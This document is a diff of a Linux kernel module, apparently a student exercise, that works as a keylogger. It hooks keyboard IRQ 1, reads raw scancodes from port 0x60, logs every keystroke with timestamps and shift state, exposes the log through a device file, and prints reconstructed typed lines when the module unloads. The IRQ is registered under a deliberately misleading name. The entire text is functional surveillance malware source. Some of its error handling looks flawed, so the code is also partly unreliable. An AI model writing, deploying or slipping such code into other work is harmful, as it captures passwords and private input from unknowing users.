@@ -5,7 +5,7 @@
 #include <linux/init.h>
 #include <linux/mutex.h>
 #include <linux/interrupt.h>
-#include <linux/keyboard.h>
+#include <linux/io.h>
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Romain Kowalski");
@@ -13,17 +13,26 @@ MODULE_DESCRIPTION("Absolutely not a keylogger.");
 
 #define MODULE_NAME "not_a_keylogger"
 #define DEVICE_NAME "definitely_not_key_logs"
-#define PRESSED 1
-#define RELEASED 0
 #define LINE_SIZE 50
 #define FULL_NAME_SIZE 20
 
 struct	key_stroke {
-	unsigned int		keycode;
-	unsigned char		keysym;
+	unsigned char		scancode;
 	char			full_name[FULL_NAME_SIZE];
 	bool			pressed; // 1 = pressed, 0 = released
 	ktime_t			time;
+};
+
+struct work_data {
+	struct work_struct	work_struct;
+	unsigned char		scancode;
+	bool			l_shift;
+	bool			r_shift;
+	bool			caps;
+	struct mutex		keys_mutex;
+	struct key_stroke	*captured_keys;
+	size_t			captured_size;
+	size_t			captured_max_size;
 };
 
 static const char	*us_keymap[][2] = {
@@ -60,12 +69,9 @@ static const char	*us_keymap[][2] = {
 	{"PAUSE", "PAUSE"},
 };
 
-static size_t			captured_size;
-static size_t			captured_max_size;
-static struct key_stroke	*captured_keys;
+static struct work_data		work_data;
 static char			*log_file;
-static struct mutex		log_mutex; // for log_file
-static struct mutex		keys_mutex; // for captured_keys
+static struct mutex		log_mutex;
 
 static int	ktime_to_hours(ktime_t time)
 {
@@ -109,64 +115,82 @@ static void	key_stroke_to_buffer(struct key_stroke entry, char *buffer,
 	minutes = ktime_to_minutes(entry.time);
 	seconds = ktime_to_seconds(entry.time);
 	snprintf(buffer, len, format, hours, minutes, seconds, entry.full_name,
-		entry.keycode, (entry.pressed ? "Pressed" : "Released"));
+		entry.scancode, (entry.pressed ? "Pressed" : "Released"));
 }
 
-static int	handle_keycode(struct keyboard_notifier_param *param)
+void	save_key_stroke(struct work_data *wd)
 {
-	mutex_lock(&keys_mutex);
-	if (captured_size == captured_max_size) {
-		captured_keys = krealloc_array(captured_keys,
-						captured_max_size * 2,
-						sizeof(struct key_stroke),
-						GFP_KERNEL);
-		if (!captured_keys) {
-			mutex_unlock(&keys_mutex);
-			return NOTIFY_BAD;
+	int	scancode;
+	int	pressed;
+
+	scancode = wd->scancode & 0x7F;
+	pressed = !(wd->scancode & 0x80);
+	if (scancode > 120)
+		return;
+	mutex_lock(&wd->keys_mutex);
+	if (wd->captured_size == wd->captured_max_size) {
+		wd->captured_keys = krealloc_array(wd->captured_keys,
+			wd->captured_max_size * 2, sizeof(struct key_stroke),
+			GFP_KERNEL);
+		if (!wd->captured_keys) {
+			pr_err("%s: krealloc_array error", MODULE_NAME);
+			mutex_unlock(&wd->keys_mutex);
+			return;
 		}
-		captured_max_size *= 2;
+		wd->captured_max_size *= 2;
 	}
-	captured_keys[captured_size].keycode = param->value;
-	captured_keys[captured_size].pressed = param->down;
-	captured_keys[captured_size].time = ktime_get_real();
-	mutex_unlock(&keys_mutex);
-	return NOTIFY_OK;
+	wd->captured_keys[wd->captured_size].scancode = scancode;
+	wd->captured_keys[wd->captured_size].pressed = pressed;
+	wd->captured_keys[wd->captured_size].time = ktime_get_real();
+	strscpy(wd->captured_keys[wd->captured_size].full_name,
+		us_keymap[scancode][(wd->l_shift | wd->r_shift) ^ wd->caps],
+		FULL_NAME_SIZE);
+	wd->captured_size++;
+	mutex_unlock(&wd->keys_mutex);
 }
 
-static int	handle_keysym(struct keyboard_notifier_param *param)
+void	bottom_half(struct work_struct *work)
 {
-	char	c;
-	int	shift = 0;
-
-	if (param->shift == 1)
-		shift = 1;
-	c = param->value;
-	mutex_lock(&keys_mutex);
-	captured_keys[captured_size].keysym = c;
-	if (c >= 33 && c <= 126) {
-		snprintf(captured_keys[captured_size].full_name, FULL_NAME_SIZE,
-			"%c", c);
-	} else {
-		strscpy(captured_keys[captured_size].full_name,
-			us_keymap[captured_keys[captured_size].keycode][shift],
-			FULL_NAME_SIZE);
+	unsigned char 		pressed;
+	unsigned char 		keycode;
+	struct work_data	*wd;
+       
+	wd = container_of(work, struct work_data, work_struct);	
+	pressed = wd->scancode & 0x80;
+	keycode = wd->scancode & 0x7F;
+	save_key_stroke(wd);
+	if (keycode == 42) { // left shift
+		if (!pressed)
+			wd->l_shift = true;
+		else
+			wd->l_shift = false;
 	}
-	captured_size++;
-	mutex_unlock(&keys_mutex);
-	return NOTIFY_OK;
+	else if (keycode == 54) { // right shift
+		if (!pressed)
+			wd->r_shift = true;
+		else
+			wd->r_shift = false;
+	}
+	else if (keycode == 58) {
+		if (!pressed)
+			wd->caps = !wd->caps;
+	}
 }
 
 static irqreturn_t	key_pressed(int irq, void *dummy)
 {
-	pr_info("Event catched\n");
+	work_data.scancode = inb(0x60);
+	schedule_work(&work_data.work_struct);
 	return IRQ_HANDLED;
 }
 
+// 96 and 28 are RETURN scancodes
 static int	next_return(int start)
 {
-	while (start < captured_size && ((captured_keys[start].keycode != 96 &&
-					captured_keys[start].keycode != 28) ||
-					!captured_keys[start].pressed))
+	while (start < work_data.captured_size &&
+		((work_data.captured_keys[start].scancode != 96 &&
+		work_data.captured_keys[start].scancode != 28) ||
+		!work_data.captured_keys[start].pressed))
 		start++;
 	return start;
 }
@@ -176,10 +200,16 @@ static void	fill_line(char *line, int start, int end)
 	int	i = 0;
 
 	while (start < end) {
-		if (captured_keys[start].keysym >= 32
-				&& captured_keys[start].keysym <= 126
-				&& captured_keys[start].pressed) {
-			line[i] = captured_keys[start].keysym;
+		if (work_data.captured_keys[start].pressed &&
+			work_data.captured_keys[start].scancode == 57) {
+			line[i] = ' ';
+			i++;
+		}
+		if (work_data.captured_keys[start].scancode < 120 &&
+			work_data.captured_keys[start].pressed && 
+			strnlen(work_data.captured_keys[start].full_name,
+				FULL_NAME_SIZE) == 1) {
+			line[i] = work_data.captured_keys[start].full_name[0];
 			i++;
 		}
 		start++;
@@ -194,7 +224,7 @@ static void	print_readable(void)
 	char	*line = NULL;
 
 	pr_info("Full readable logs:");
-	while (end < captured_size) {
+	while (end < work_data.captured_size) {
 		end = next_return(start);
 		line = kmalloc(end - start + 1, GFP_KERNEL);
 		if (!line) {
@@ -230,12 +260,15 @@ static int	logs_open(struct inode *inode, struct file *file)
 	int	i;
 
 	try_module_get(THIS_MODULE);
-	mutex_lock(&log_mutex);
 	kfree(log_file);
 	log_len = 0;
 	i = 0;
-	while (i < captured_size) {
-		key_stroke_to_buffer(captured_keys[i], line, LINE_SIZE);
+	while (i < work_data.captured_size) {
+		mutex_lock(&work_data.keys_mutex);
+		key_stroke_to_buffer(work_data.captured_keys[i], line,
+					LINE_SIZE);
+		mutex_unlock(&work_data.keys_mutex);
+		mutex_lock(&log_mutex);
 		if (log_file)
 			log_len = strlen(log_file);
 		log_file = krealloc_array(log_file, log_len + strlen(line) + 1,
@@ -243,15 +276,16 @@ static int	logs_open(struct inode *inode, struct file *file)
 		if (!log_file) {
 			mutex_unlock(&log_mutex);
 			pr_err("%s: krealloc_array error\n", MODULE_NAME);
+			module_put(THIS_MODULE);
 			return 1;
 		}
+		mutex_unlock(&log_mutex);
 		if (log_len == 0)
 			log_len = strscpy(log_file, line, strlen(line) + 1);
 		else
 			strncat(log_file, line, strlen(line));
 		i++;
 	}
-	mutex_unlock(&log_mutex);
 	return 0;
 }
 
@@ -288,31 +322,46 @@ static int	__init kl_init(void)
 		pr_err("%s: Loading module failed\n", MODULE_NAME);
 		return -ret;
 	}
-	pr_info("%s: Module loaded\n", MODULE_NAME);
-	ret = request_irq(1, key_pressed, IRQF_SHARED, "keyboard", NULL);
+	ret = request_irq(1, key_pressed, IRQF_SHARED,
+				"what?_no_its_not_a_kelogger_wdym",
+				(void *)(key_pressed));
 	if (ret) {
-		misc_deregister(&logs_device);
 		pr_err("%s: Registering IRQ failed\n", MODULE_NAME);
-		return -ret;
+		goto err_free_irq;
 	}
-	captured_max_size = 10;
-	captured_keys = kmalloc_array(captured_max_size,
+	work_data.captured_max_size = 10;
+	work_data.captured_keys = kmalloc_array(work_data.captured_max_size,
 					sizeof(struct key_stroke), GFP_KERNEL);
-	if (!captured_keys) {
-		misc_deregister(&logs_device);
-		free_irq(1, key_pressed);
-		return 1;
+	if (!work_data.captured_keys) {
+		pr_err("%s: allocation of captured_keys array failed\n",
+			MODULE_NAME);
+		goto err_free_misc;
 	}
-	pr_info("%s: Keyboard notifier registered\n", MODULE_NAME);
+	log_file = NULL;
+	work_data.l_shift = false;
+	work_data.r_shift = false;
+	work_data.caps = false;
+	mutex_init(&log_mutex);
+	mutex_init(&work_data.keys_mutex);
+	INIT_WORK(&work_data.work_struct, bottom_half);
+	pr_info("%s: IRQ registered\n", MODULE_NAME);
+	pr_info("%s: Module loaded\n", MODULE_NAME);
 	return 0;
+
+err_free_misc:
+	misc_deregister(&logs_device);
+err_free_irq:
+	free_irq(1, key_pressed);
+	return ret;
 }
 
 static void	__exit kl_cleanup(void)
 {
+	flush_work(&work_data.work_struct);
 	print_readable();
 	misc_deregister(&logs_device);
 	kfree(log_file);
-	kfree(captured_keys);
+	kfree(work_data.captured_keys);
 	free_irq(1, key_pressed);
 	pr_info("%s: IRQ unregistered\n", MODULE_NAME);
 	pr_info("%s: Module unloaded\n", MODULE_NAME);
